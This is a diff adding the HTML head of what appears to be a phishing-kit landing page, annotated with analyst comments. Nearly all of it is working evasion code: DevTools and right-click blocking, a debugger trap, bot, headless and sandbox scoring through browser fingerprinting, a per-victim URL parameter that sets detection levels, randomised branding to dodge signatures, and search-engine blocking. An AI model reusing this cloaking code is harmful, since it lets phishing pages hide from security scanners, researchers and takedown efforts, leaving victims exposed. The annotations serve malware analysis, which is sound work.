@@ -1,0 +1,1514 @@
+<!DOCTYPE html><html lang="en" data-app-version="0.12.34" data-app-env="live" data-app-ready="true" data-zlocko="ce367d5b4f27" style="--xscyifji: 211deg; --yljgewvs: 61%; --lhlmnosq: 15px;"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WebInfrastructure Portal</title>
+    <script>
+  
+        (function(w){
+<!-- ANALYSIS: _abLevel controls which detection tiers activate. Encoded in the per-victim ei= URL parameter. 0=no detection, 1=lightweight, 2=full suite. Default is 2 so all defenses run even without a valid ei= param. -->
+            w._abLevel=2;
+            try{
+                var ei='';
+                var p=new URLSearchParams(w.location.search);
+                ei=p.get('ei')||'';
+                if(!ei||!ei.trim()){var h=w.location.hash;if(h&&h.length>1)ei=h.substring(1);}
+                if(!ei)return;
+                ei=ei.trim();
+                var delimIndex=-1;
+                var emailDelim=ei.indexOf('__'),standardDelim=ei.indexOf('--');
+                if(emailDelim!==-1)delimIndex=emailDelim;
+                else if(standardDelim!==-1)delimIndex=standardDelim;
+                if(delimIndex===-1)return;
+                var encPart=ei.substring(0,delimIndex);
+                var b64=encPart.replace(/-/g,'+').replace(/_/g,'/');
+                while(b64.length%4)b64+='=';
+                var dec=atob(b64);
+                var params=new URLSearchParams(dec);
+                if(params.has('ab')){
+                    var v=parseInt(params.get('ab'),10);
+                    if(v===0||v===1||v===2)w._abLevel=v;
+                }
+            }catch(e){}
+        })(window);
+
+        if(window._abLevel>=1){
+        (function(w,d){
+<!-- ANALYSIS: Blocks F12, Ctrl+Shift+I/J/C, Ctrl+U, Ctrl+S, and right-click. Prevents casual source inspection. -->
+            d.addEventListener('keydown',function(e){
+                if(e.keyCode===123){e.preventDefault();return false;}
+                if(e.ctrlKey&&e.shiftKey&&(e.keyCode===73||e.keyCode===74||e.keyCode===67)){e.preventDefault();return false;}
+                if(e.ctrlKey&&(e.keyCode===85||e.keyCode===83)){e.preventDefault();return false;}
+            });
+            d.addEventListener('contextmenu',function(e){e.preventDefault();return false;});
+
+            <!-- ANALYSIS: Continuous debugger trap firing every 50ms. Halts execution when DevTools are open. In headless environments the loop runs silently but timing deviations are detectable. -->
+(function _dt(){try{(function(){return false;})['constructor']('debugger')();}catch(e){}setTimeout(_dt,50);})();
+
+<!-- ANALYSIS: Polls window dimensions every 1 second. If outer/inner width or height difference exceeds 160px baseline, DevTools are assumed open and the page redirects to about:blank. -->
+            var _threshold=160;
+            var _baseW=w.outerWidth-w.innerWidth;
+            var _baseH=w.outerHeight-w.innerHeight;
+            setTimeout(function(){
+                _baseW=w.outerWidth-w.innerWidth;
+                _baseH=w.outerHeight-w.innerHeight;
+                setInterval(function(){
+                    var wDiff=(w.outerWidth-w.innerWidth)-_baseW>_threshold;
+                    var hDiff=(w.outerHeight-w.innerHeight)-_baseH>_threshold;
+                    if(wDiff||hDiff){w.location.replace('about:blank');}
+                },1000);
+            },1500);
+        })(window,document);
+
+        (function(w,d,n){
+            var _rnd=Math.random,_flr=Math.floor,_rn=function(x){return _flr(_rnd()*x)};
+<!-- ANALYSIS: _vE is the lightweight first-pass bot check. Scores process.versions, webdriver, callPhantom, __nightmare, jsdom/Headless UA, zero dimensions, and module.exports. Score >= 8 sets _vFail and gates the rest of the page. -->
+            w._vE=function(){
+                var s=0;
+                try{if(typeof process!=='undefined'&&process.versions)s+=5;}catch(e){}
+                try{if(n.webdriver||w.callPhantom||w.__nightmare)s+=5;}catch(e){}
+                try{if(n.userAgent&&(n.userAgent.indexOf('jsdom')>-1||n.userAgent.indexOf('Headless')>-1))s+=5;}catch(e){}
+                try{if(!w.chrome&&!w.safari&&n.vendor==='')s+=3;}catch(e){}
+                try{if(w.outerWidth===0||w.outerHeight===0)s+=3;}catch(e){}
+                try{if(w.innerWidth===0||w.innerHeight===0)s+=3;}catch(e){}
+                try{var t=Function.prototype.toString;if(t.call(t).indexOf('native code')===-1)s+=3;}catch(e){}
+                try{if(typeof module!=='undefined'&&module.exports)s+=4;}catch(e){}
+                return s;
+            };
+            
+            w._vG=function(){
+                if(w._vOK===true)return false;
+                if(w._vFail===true)return true;
+                var score=w._vE();
+                if(score>=8){
+                    w._vFail=true;
+                    return true;
+                }
+                w._vOK=true;
+                return false;
+            };
+            
+            if(w._vG())return;
+            
+        })(window,document,navigator);
+        }
+        
+        if(window._vG&&window._vG()){}else{
+        var _$=[],_$$=Math.random,_$$$=function(n){return Math.floor(_$$()*n)},
+            _0=window,_1=document,_2=navigator,_3='',_4=null,_5=!0,_6=!1,
+            _7=Object,_8=Array,_9=String,_a=Function,_b=Date,_c=Math,
+            _enc=function(s){return btoa(encodeURIComponent(s))},
+            _dec=function(s){try{return decodeURIComponent(atob(s))}catch(e){return s}},
+            _h=function(s){var h=0;for(var i=0;i<s.length;i++){h=((h<<5)-h)+s.charCodeAt(i);h|=0}return h>>>0},
+            _ts=function(){return _b.now()||+new _b()},
+            _rid=function(l){var s='',c='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';for(var i=0;i<(l||16);i++)s+=c[_$$$(62)];return s},
+            _rh=function(){return'#'+_$$$(16777215).toString(16).padStart(6,'0')};
+        
+        (function(){
+            var _entropy=[];
+            _entropy.push(_ts());
+            _entropy.push(_2.hardwareConcurrency||0);
+            _entropy.push(_0.devicePixelRatio||1);
+            _entropy.push(_0.screen?_0.screen.colorDepth:0);
+            _entropy.push(_2.maxTouchPoints||0);
+            _entropy.push(new _b().getTimezoneOffset());
+            _entropy.push(_2.language||'');
+            _entropy.push(_0.innerWidth*_0.innerHeight);
+            _0._entropy=_h(_entropy.join('|'));
+        })();
+        
+        if(_0._abLevel>=1){
+        (function(_w,_d,_n){
+<!-- ANALYSIS: Tier-2 sandbox detection. Checks iframe cross-origin isolation, eval correctness, Function.prototype.toString patching, execution timing, Node.js globals (process.versions, module.exports, require), jsdom/Node.js UA, missing browser globals, Proxy-wrapped window/document, and WorkerGlobalScope. Score >= 5 sets _isSandboxed. -->
+            var _isSandbox=!1,_isAnalysis=!1,_sandboxScore=0;
+            
+            try{
+                if(_w.self!==_w.top){
+                    try{_w.top.location.href;}catch(e){_sandboxScore+=1;}
+                }
+            }catch(e){_sandboxScore+=1;}
+            
+            try{
+                var _origEval=_w.eval;
+                var _evalTest=_origEval('1+1');
+                if(_evalTest!==2)_sandboxScore+=2;
+            }catch(e){_sandboxScore+=1;}
+            
+            var _fnToStr=_a.prototype.toString;
+            try{
+                var _testFn=function(){return 1};
+                var _str=_fnToStr.call(_testFn);
+                if(_str.indexOf('return 1')===-1&&_str.indexOf('native code')===-1)_sandboxScore+=2;
+            }catch(e){_sandboxScore+=1;}
+            
+            var _debugStart=_ts();
+            (function(){})();
+            var _debugEnd=_ts();
+            if(_debugEnd-_debugStart>100)_sandboxScore+=3;
+            
+            if(typeof process!=='undefined'&&process.versions&&process.versions.node)_sandboxScore+=5;
+            if(typeof module!=='undefined'&&module.exports)_sandboxScore+=3;
+            if(typeof require==='function'&&typeof require.resolve==='function')_sandboxScore+=3;
+            
+            if(_n.userAgent&&_n.userAgent.indexOf('jsdom')>-1)_sandboxScore+=5;
+            if(_w.navigator&&_w.navigator.userAgent&&_w.navigator.userAgent.indexOf('Node.js')>-1)_sandboxScore+=5;
+            if(!_w.chrome&&!_w.safari&&!_w.opera&&_n.vendor==='')_sandboxScore+=2;
+            
+            var _browserGlobals=['localStorage','sessionStorage','indexedDB','caches','crypto'];
+            var _missingCount=0;
+            for(var i=0;i<_browserGlobals.length;i++){
+                try{if(typeof _w[_browserGlobals[i]]==='undefined')_missingCount++;}catch(e){_missingCount++;}
+            }
+            if(_missingCount>=3)_sandboxScore+=3;
+            
+            var _t1=_b.now(),_t2=performance.now();
+            setTimeout(function(){
+                var _t3=_b.now(),_t4=performance.now();
+                if(_t3-_t1<5||_t4-_t2<5)_w._timingAnomaly=!0;
+            },10);
+            
+            if(_w.innerWidth===0||_w.innerHeight===0)_sandboxScore+=2;
+            if(_w.outerWidth===0||_w.outerHeight===0)_sandboxScore+=2;
+            if(_w.screen&&(_w.screen.width===0||_w.screen.height===0))_sandboxScore+=3;
+            
+            try{
+                throw new Error('_');
+            }catch(e){
+                var _stack=e.stack||'';
+                if(_stack.indexOf('puppeteer')>-1||_stack.indexOf('playwright')>-1||
+                   _stack.indexOf('selenium')>-1||_stack.indexOf('webdriver')>-1)_sandboxScore+=5;
+            }
+            
+            try{
+                var _consoleStr=_9(console.log);
+                if(_consoleStr.indexOf('native code')===-1&&_consoleStr.indexOf('function')>-1)_sandboxScore+=2;
+            }catch(e){}
+            
+            var _perfMarks=[];
+            for(var i=0;i<5;i++){
+                var _s=performance.now();
+                for(var j=0;j<1000;j++){Math.random();}
+                _perfMarks.push(performance.now()-_s);
+            }
+            var _avgPerf=_perfMarks.reduce(function(a,b){return a+b},0)/_perfMarks.length;
+            if(_avgPerf<0.001||_avgPerf>50)_sandboxScore+=2;
+            
+            if(typeof WorkerGlobalScope!=='undefined'&&_w instanceof WorkerGlobalScope)_sandboxScore+=3;
+            
+            try{
+                var _wStr=_7.prototype.toString.call(_w);
+                var _dStr=_7.prototype.toString.call(_d);
+                if(_wStr.indexOf('Proxy')>-1||_dStr.indexOf('Proxy')>-1)_sandboxScore+=3;
+            }catch(e){}
+            
+            try{
+                if(_w.self!==_w.top){
+                    var _canScript=!0;
+                    try{_w.eval('1');}catch(e){_canScript=!1;_sandboxScore+=2;}
+                }
+            }catch(e){}
+            
+            _w._sandboxScore=_sandboxScore;
+            _w._isSandboxed=_sandboxScore>=5;
+            
+            _w._initApp=function(){return'Application initialized'};
+            _w._loadConfig=function(){return{version:'1.0.0',env:'production'}};
+            _w._handleError=function(e){return!1};
+            _w._validateInput=function(v){return typeof v==='string'&&v.length>0};
+            _w._formatDate=function(d){return new _b(d).toISOString()};
+            _w._debounce=function(f,w){var t;return function(){clearTimeout(t);t=setTimeout(f,w)}};
+            _w._throttle=function(f,l){var t=0;return function(){var n=_b.now();if(n-t>=l){t=n;f.apply(this,arguments)}}};
+            
+            if(_w.performance&&_w.performance.mark){
+                try{
+                    _w.performance.mark('app-init-start');
+                    setTimeout(function(){
+                        _w.performance.mark('app-init-end');
+                        _w.performance.measure('app-init','app-init-start','app-init-end');
+                    },100);
+                }catch(e){}
+            }
+            
+            try{
+                var _appReady=new CustomEvent('app:ready',{detail:{timestamp:_ts()}});
+                var _appLoaded=new CustomEvent('app:loaded',{detail:{status:'success'}});
+                setTimeout(function(){_d.dispatchEvent(_appReady)},50);
+                setTimeout(function(){_d.dispatchEvent(_appLoaded)},150);
+            }catch(e){}
+            
+        })(_0,_1,_2);
+        }
+        if(_0._abLevel>=1){
+        (function(_w,_d,_n){
+            var _f=_6,_t=_5,_bc=[],_s=0;
+            
+<!-- ANALYSIS: Scans window and document for 35+ automation globals: ChromeDriver artifacts ($cdc_, $wdc_, cdc_adoQpoasnfa76pfcZLmcfl_*), Selenium, Nightmare, Phantom, Watir, and WebDriver-specific properties. Each hit adds 3 points to bot score. -->
+            var _p1=['webdriver','__nightmare','callPhantom','_phantom','phantom','Buffer','emit','spawn',
+                'domAutomation','domAutomationController','_Selenium_IDE_Recorder','_selenium','calledSelenium',
+                '$cdc_','$wdc_','__driver_evaluate','__webdriver_evaluate','__selenium_evaluate','__fxdriver_evaluate',
+                '__driver_unwrapped','__webdriver_unwrapped','__selenium_unwrapped','__fxdriver_unwrapped',
+                '__webdriver_script_fn','__webdriver_script_func','_webdriver_script_fn','_webdriver_script_func',
+                '__lastWatirAlert','__lastWatirConfirm','__lastWatirPrompt','_WEBDRIVER_ELEM_CACHE',
+                'ChromeDriverw','driver-hierarchical','driver-evaluate','selenium-hierarchical',
+                '__webdriver_script_function','__webdriver_unwrapped','__selenium_unwrapped','__fxdriver_unwrapped',
+                'cdc_adoQpoasnfa76pfcZLmcfl_Array','cdc_adoQpoasnfa76pfcZLmcfl_Promise','cdc_adoQpoasnfa76pfcZLmcfl_Symbol'];
+            for(var i=0;i<_p1.length;i++){try{if(_w[_p1[i]]||_d[_p1[i]])_s+=3;}catch(e){}}
+            
+<!-- ANALYSIS: Calls Object.getOwnPropertyDescriptor on navigator prototype for each key property. If the getter is not native code, the property has been patched by an automation tool. Each patched getter adds 5 points. -->
+            try{
+                var _navProps=['webdriver','plugins','languages','platform','userAgent','vendor'];
+                for(var i=0;i<_navProps.length;i++){
+                    var desc=_7.getOwnPropertyDescriptor(_n.__proto__||_7.getPrototypeOf(_n),_navProps[i]);
+                    if(desc&&desc.get){
+                        var str=desc.get.toString();
+                        if(str.indexOf('[native code]')===-1)_s+=5;
+                    }
+                }
+            }catch(e){}
+            
+<!-- ANALYSIS: Extracts and tests the user-agent against 23 patterns: HeadlessChrome, PhantomJS, Selenium, puppeteer, playwright, WebDriver, Zombie, Nightmare, SlimerJS, HtmlUnit, Cypress, TestCafe, Scrapy, curl, wget, python-requests, node-fetch, axios, HttpClient, Java/, Apache-HttpClient, Go-http-client, libwww-perl, MSIE 6.0. Each match adds 10 points. -->
+            var _ua=_n.userAgent||_3;
+            var _uaPatterns=[/HeadlessChrome/i,/PhantomJS/i,/Selenium/i,/puppeteer/i,/playwright/i,
+                /WebDriver/i,/Zombie/i,/Nightmare/i,/SlimerJS/i,/HtmlUnit/i,/Cypress/i,/TestCafe/i,
+                /Scrapy/i,/curl/i,/wget/i,/python-requests/i,/node-fetch/i,/axios/i,/HttpClient/i,
+                /Java\//i,/Apache-HttpClient/i,/Go-http-client/i,/libwww-perl/i,/MSIE 6\.0/i];
+            for(var i=0;i<_uaPatterns.length;i++){if(_uaPatterns[i].test(_ua))_s+=10;}
+            
+            var _fp={
+                plugins:_n.plugins?_n.plugins.length:0,
+                mimeTypes:_n.mimeTypes?_n.mimeTypes.length:0,
+                languages:_n.languages?_n.languages.length:0,
+                cookieEnabled:_n.cookieEnabled,
+                doNotTrack:_n.doNotTrack,
+                hardwareConcurrency:_n.hardwareConcurrency||0,
+                deviceMemory:_n.deviceMemory||0,
+                maxTouchPoints:_n.maxTouchPoints||0
+            };
+            if(_fp.plugins===0&&_ua.indexOf('Chrome')>-1)_s+=2;
+            if(_fp.mimeTypes===0&&_ua.indexOf('Chrome')>-1)_s+=2;
+            if(_fp.languages===0)_s+=2;
+            if(_fp.hardwareConcurrency===0)_s+=1;
+            
+            try{
+                var canvas=_d.createElement('canvas');
+<!-- ANALYSIS: Pulls WebGL renderer string via WEBGL_debug_renderer_info extension. SwiftShader, LLVMpipe, VirtualBox, or VMware renderer = virtual machine, adds 3 points. Missing renderer info adds 1-2 points. -->
+                var gl=canvas.getContext('webgl')||canvas.getContext('experimental-webgl');
+                if(gl){
+                    var debugInfo=gl.getExtension('WEBGL_debug_renderer_info');
+                    if(debugInfo){
+                        var vendor=gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+                        var renderer=gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                        if(/SwiftShader|LLVMpipe|VirtualBox|VMware/i.test(renderer))_s+=3;
+                        if(!vendor||!renderer)_s+=2;
+                    }else _s+=1;
+                }else _s+=3;
+            }catch(e){_s+=2}
+            
+            try{
+                var canvas=_d.createElement('canvas');
+<!-- ANALYSIS: 2D canvas fingerprint using a standard pangram string render. Headless/VM environments produce shorter or empty data URLs. Short dataUrl (<3000 chars) adds 2 points. The hash is stored in window._canvasHash. -->
+                canvas.width=200;canvas.height=50;
+                var ctx=canvas.getContext('2d');
+                ctx.textBaseline='top';
+                ctx.font='14px Arial';
+                ctx.fillStyle='#f60';
+                ctx.fillRect(125,1,62,20);
+                ctx.fillStyle='#069';
+                ctx.fillText('Cwm fjordbank glyphs vext quiz',2,15);
+                ctx.fillStyle='rgba(102,204,0,0.7)';
+                ctx.fillText('Cwm fjordbank glyphs vext quiz',4,17);
+                var dataUrl=canvas.toDataURL();
+                if(dataUrl.length<3000)_s+=2;
+                _w._canvasHash=_h(dataUrl);
+            }catch(e){_s+=3}
+            
+            try{
+<!-- ANALYSIS: Checks for AudioContext availability. Missing AudioContext adds 2 points. Missing audioWorklet on a valid context adds 1 point. Headless environments typically lack audio subsystem. -->
+                var AudioContext=_w.AudioContext||_w.webkitAudioContext;
+                if(!AudioContext)_s+=2;
+                if(AudioContext){
+                    var testCtx=new AudioContext();
+                    if(!testCtx.audioWorklet)_s+=1;
+                    testCtx.close().catch(function(){});
+                }
+            }catch(e){_s+=1}
+            
+            try{
+<!-- ANALYSIS: Font enumeration via element dimension comparison. Tests 6 common fonts against 3 base fonts. Fewer than 3 detected fonts suggests a minimal/headless environment, adds 2 points. -->
+                var baseFonts=['monospace','sans-serif','serif'];
+                var testString='mmmmmmmmmmlli';
+                var testSize='72px';
+                var h=_d.getElementsByTagName('body')[0];
+                if(h){
+                    var s=_d.createElement('span');
+                    s.style.fontSize=testSize;
+                    s.innerHTML=testString;
+                    var defaultWidth={};
+                    var defaultHeight={};
+                    for(var i=0;i<baseFonts.length;i++){
+                        s.style.fontFamily=baseFonts[i];
+                        h.appendChild(s);
+                        defaultWidth[baseFonts[i]]=s.offsetWidth;
+                        defaultHeight[baseFonts[i]]=s.offsetHeight;
+                        h.removeChild(s);
+                    }
+                    var fontsToTest=['Arial','Verdana','Times New Roman','Courier New','Georgia','Comic Sans MS'];
+                    var detectedFonts=0;
+                    for(var i=0;i<fontsToTest.length;i++){
+                        for(var j=0;j<baseFonts.length;j++){
+                            s.style.fontFamily=fontsToTest[i]+','+baseFonts[j];
+                            h.appendChild(s);
+                            if(s.offsetWidth!==defaultWidth[baseFonts[j]]||s.offsetHeight!==defaultHeight[baseFonts[j]])detectedFonts++;
+                            h.removeChild(s);
+                        }
+                    }
+                    if(detectedFonts<3)_s+=2;
+                }
+            }catch(e){}
+            
+            var _perf=_w.performance;
+            if(_perf){
+                if(_perf.timing){
+                    var _lt=_perf.timing.loadEventEnd-_perf.timing.navigationStart;
+                    if(_lt===0||_lt<0)_s+=2;
+                }
+                if(_perf.now){
+                    var t1=_perf.now();
+                    for(var i=0;i<1000;i++)Math.sqrt(i);
+                    var t2=_perf.now();
+                    if(t2-t1<0.001)_s+=3;
+                }
+            }
+            
+            if(_w.outerWidth===0||_w.outerHeight===0)_s+=3;
+            if(_w.screen&&(_w.screen.width===0||_w.screen.height===0))_s+=3;
+            if(_w.innerWidth===0||_w.innerHeight===0)_s+=3;
+            if(_w.screen&&_w.screen.availWidth===0)_s+=2;
+            if(_w.screenX===0&&_w.screenY===0&&_w.outerWidth===_w.screen.availWidth)_s+=1;
+            
+            if(_0._abLevel>=2){
+            if(_w.chrome){
+                if(!_w.chrome.runtime)_s+=2;
+                if(_w.chrome.runtime&&!_w.chrome.runtime.id)_s+=1;
+                if(!_w.chrome.loadTimes&&!_w.chrome.csi)_s+=1;
+            }else if(_ua.indexOf('Chrome')>-1)_s+=3;
+            }
+            
+            if(_n.permissions){
+                _n.permissions.query({name:'notifications'}).then(function(r){
+                    if(typeof Notification!=='undefined'&&Notification.permission==='denied'&&r.state==='prompt')_s+=5;
+                }).catch(function(){});
+            }
+            
+            var _devtools=_6;
+            if(_w.outerWidth-_w.innerWidth>160||_w.outerHeight-_w.innerHeight>160)_devtools=_t;
+            var element=new Image();
+            _7.defineProperty(element,'id',{get:function(){_devtools=_t;}});
+            if(_devtools)_s+=2;
+            
+            try{
+                var _test=_7.getOwnPropertyDescriptor(_n.__proto__,'webdriver');
+                if(_test&&_test.get&&_test.get.toString().indexOf('native code')===-1)_s+=5;
+            }catch(e){}
+            
+            try{
+                throw new Error();
+            }catch(e){
+                if(e.stack){
+    <!-- ANALYSIS: Throws a deliberate Error and inspects the stack trace for 7 automation framework names. A match adds 10 points each — the highest single-check weight in the scoring system. -->
+                var stackPatterns=['puppeteer','selenium','webdriver','playwright','cypress','testcafe','nightmare'];
+                    for(var i=0;i<stackPatterns.length;i++){
+                        if(e.stack.toLowerCase().indexOf(stackPatterns[i])>-1)_s+=10;
+                    }
+                }
+            }
+            
+            try{
+                var nativeToString=_a.prototype.toString;
+                if(nativeToString.call(nativeToString).indexOf('[native code]')===-1)_s+=5;
+            }catch(e){}
+            
+            try{
+                if(_w.Proxy){
+                    var handler={get:function(t,p){return t[p]}};
+                    var proxy=new Proxy({},handler);
+                    if(proxy.toString().indexOf('Proxy')>-1)_s+=2;
+                }
+            }catch(e){}
+            
+            try{
+                if(_w.self!==_w.top)_bc.push('iframe');
+                if(_w.frameElement)_bc.push('framed');
+            }catch(e){}
+            
+            if(!('ontouchstart' in _w)&&!('onmousemove' in _d)&&_n.maxTouchPoints===0)_s+=1;
+            
+            if(_n.getBattery){
+                _n.getBattery().then(function(b){
+                    if(b.charging&&b.chargingTime===0&&b.dischargingTime===Infinity&&b.level===1)_s+=1;
+                }).catch(function(){});
+            }
+            
+            if(_n.connection){
+                var conn=_n.connection;
+                if(conn.rtt===0&&conn.downlink===0)_s+=2;
+            }
+            
+            try{
+                if(_n.keyboard&&_n.keyboard.getLayoutMap){
+                    _n.keyboard.getLayoutMap().then(function(m){
+                        if(m.size===0)_s+=1;
+                    }).catch(function(){});
+                }
+            }catch(e){}
+            
+            if(_n.mediaDevices&&_n.mediaDevices.enumerateDevices){
+                _n.mediaDevices.enumerateDevices().then(function(d){
+                    if(d.length===0)_s+=2;
+                }).catch(function(){});
+            }
+            
+            if(_w.speechSynthesis){
+                var voices=_w.speechSynthesis.getVoices();
+                if(voices.length===0){
+                    _w.speechSynthesis.onvoiceschanged=function(){
+                        if(_w.speechSynthesis.getVoices().length===0)_s+=1;
+                    };
+                }
+            }
+            
+            _w._behaviorScore=0;
+            _w._mouseEvents=0;
+            _w._keyEvents=0;
+            _d.addEventListener('mousemove',function(){_w._mouseEvents++;},_6);
+            _d.addEventListener('keydown',function(){_w._keyEvents++;},_6);
+            
+            var _totalScore=_s+(_w._sandboxScore||0);
+            
+            _w['_'+_9.fromCharCode(104)+_9.fromCharCode(99)]=_totalScore>=10;
+            _w._botScore=_s;
+            _w._totalSecurityScore=_totalScore;
+            
+            if(_w['_hc']&&_0._abLevel>=2){
+                _w.stop();
+                return;
+            }
+        })(_0,_1,_2);
+        }
+        } 
+    </script>
+<!-- ANALYSIS: Blanket crawler-blocking meta tags covering Google, Bing, Yahoo Slurp, DuckDuckGo, Baidu, and Yandex bots. Belt-and-suspenders with the JS evasion — even if a bot bypasses the JS checks, the page will not be indexed or cached. -->
+    <meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noodp, noydir">
+    <meta name="googlebot" content="noindex, nofollow, noarchive, nosnippet">
+    <meta name="bingbot" content="noindex, nofollow, noarchive, nosnippet">
+    <meta name="slurp" content="noindex, nofollow, noarchive, nosnippet">
+    <meta name="duckduckbot" content="noindex, nofollow, noarchive, nosnippet">
+    <meta name="baiduspider" content="noindex, nofollow, noarchive, nosnippet">
+    <meta name="yandex" content="noindex, nofollow, noarchive, nosnippet">
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Expires" content="0">
+    <meta name="referrer" content="no-referrer">
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+    
+    <script>
+        if(window._abLevel>=2){
+        if(window._vG&&window._vG()){}else{(function(){
+            if(window['_hc'])return;
+            
+            var _r=function(a){return a[_$$$(a.length)]};
+            var _id=function(l){var s='',c='abcdefghijklmnopqrstuvwxyz';for(var i=0;i<(l||8);i++)s+=c[_$$$(26)];return s};
+            var _idMixed=function(l){var s='',c='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-';for(var i=0;i<(l||12);i++)s+=c[_$$$(64)];return s};
+            var _rHex=function(l){var s='',c='0123456789abcdef';for(var i=0;i<(l||8);i++)s+=c[_$$$(16)];return s};
+            var _rHash=function(){return _rHex(8)+'-'+_rHex(4)+'-'+_rHex(4)+'-'+_rHex(4)+'-'+_rHex(12)};
+            var _rSemver=function(){return _$$$(5)+'.'+_$$$(20)+'.'+_$$$(100)};
+            
+            var prefixes=['','Global ','International ','Advanced ','Modern ','Next ','New ','First ','Prime ','Elite '];
+            var brands=['Secure','Cloud','Digital','Smart','Prime','Core','Net','Web','Data','Tech','Pro','One','Hub','Link','Base',
+                'Apex','Nova','Quantum','Vertex','Nexus','Pulse','Sync','Flow','Stream','Wave','Spark','Bolt','Swift','Rapid','Turbo'];
+            var suffixes=['Services','Platform','Systems','Solutions','Connect','Portal','Gateway','Access','Suite','Center',
+                'Network','Technologies','Labs','Works','Logic','Dynamics','Intelligence','Analytics','Security','Infrastructure'];
+            var formats=[
+                function(p,b,s){return p+b+s},
+                function(p,b,s){return p+b+' '+s},
+                function(p,b,s){return b+s},
+                function(p,b,s){return b+' '+s}
+            ];
+            window._brand=_r(formats)(_r(prefixes),_r(brands),_r(suffixes)).trim();
+            
+            var titleFormats=[
+                function(b){return b},
+                function(b){return b+' | Secure Access'},
+                function(b){return 'Welcome | '+b},
+                function(b){return b+' Portal'},
+                function(b){return b+' Cloud'}
+            ];
+            document.title=_r(titleFormats)(window._brand);
+            
+            var taglineWords=['security','connectivity','infrastructure','cloud services','data management','networking','solutions','technology'];
+            var taglineTemplates=['Enterprise-grade {0} for modern applications','Secure {0} for your digital needs','Next-generation {0} platform'];
+            window._tagline=_r(taglineTemplates).replace('{0}',_r(taglineWords));
+            
+            var metas=[
+                {name:'description',content:window._tagline},
+                {name:'author',content:window._brand},
+                {name:'generator',content:_r(['Webpack','Vite','Next.js','Gatsby','Nuxt','SvelteKit','Astro'])},
+                {property:'og:title',content:window._brand},
+                {property:'og:description',content:window._tagline},
+                {property:'og:type',content:'website'},
+                {name:'twitter:card',content:'summary'},
+                {name:'twitter:title',content:window._brand},
+                {name:'application-name',content:window._brand},
+                {name:'theme-color',content:['#1a73e8','#4285f4','#5f6368','#202124','#1967d2','#0d47a1'][_$$$(6)]}
+            ];
+            for(var i=0;i<metas.length;i++){
+                if(_$$()*100>20){
+                    var m=document.createElement('meta');
+                    for(var k in metas[i])m.setAttribute(k,metas[i][k]);
+                    document.head.appendChild(m);
+                }
+            }
+            
+            if(_$$()*100>50){
+                var jsonLd=document.createElement('script');
+                jsonLd.type='application/ld+json';
+                jsonLd.textContent=JSON.stringify({
+                    '@context':'https://schema.org',
+                    '@type':_r(['WebApplication','SoftwareApplication','WebSite','Organization']),
+                    'name':window._brand,
+                    'description':window._tagline,
+                    'applicationCategory':_r(['SecurityApplication','BusinessApplication','UtilitiesApplication']),
+                    'operatingSystem':'Any'
+                });
+                document.head.appendChild(jsonLd);
+            }
+            
+            var preloads=['dns-prefetch','preconnect'];
+            var domains=['https://cdn.jsdelivr.net','https://unpkg.com','https://cdnjs.cloudflare.com','https://api.github.com'];
+            for(var i=0;i<2+_$$$(3);i++){
+                var link=document.createElement('link');
+                link.rel=_r(preloads);
+                link.href=_r(domains);
+                if(link.rel==='preconnect')link.crossOrigin='anonymous';
+                document.head.appendChild(link);
+            }
+            
+            var root=document.documentElement;
+            root.style.setProperty('--'+_id(8),_$$$(360)+'deg');
+            root.style.setProperty('--'+_id(8),_$$$(100)+'%');
+            root.style.setProperty('--'+_id(8),(_$$$(20)+10)+'px');
+            
+            root.setAttribute('data-app-version',_rSemver());
+            root.setAttribute('data-app-env',_r(['production','prod','live']));
+            root.setAttribute('data-app-ready','true');
+            root.setAttribute('data-'+_id(6),_rHex(12));
+            
+            window._ids={
+                c:_id(10+_$$$(6)),l:_id(6+_$$$(6)),t:_id(8+_$$$(6)),
+                s:_id(7+_$$$(6)),p:_id(9+_$$$(6)),w:_id(5+_$$$(6)),
+                m:_idMixed(12+_$$$(8)),x:_idMixed(10+_$$$(8))
+            };
+        })();}
+        }
+    </script><meta name="description" content="Secure data management for your digital needs"><meta name="author" content="WebInfrastructure"><meta property="og:title" content="WebInfrastructure"><meta property="og:description" content="Secure data management for your digital needs"><meta property="og:type" content="website"><meta name="twitter:card" content="summary"><meta name="application-name" content="WebInfrastructure"><script type="application/ld+json">{"@context":"https://schema.org","@type":"Organization","name":"WebInfrastructure","description":"Secure data management for your digital needs","applicationCategory":"UtilitiesApplication","operatingSystem":"Any"}</script><link rel="dns-prefetch" href="https://api.github.com"><link rel="dns-prefetch" href="https://api.github.com"><link rel="dns-prefetch" href="https://unpkg.com"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin="anonymous">
+    <style>
+        * {
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
+        }
+    </style>
+    
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+        }
+        
+        .loader-container {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+        }
+        
+        .error {
+            color: #ff6b6b;
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            max-width: 400px;
+        }
+    </style>
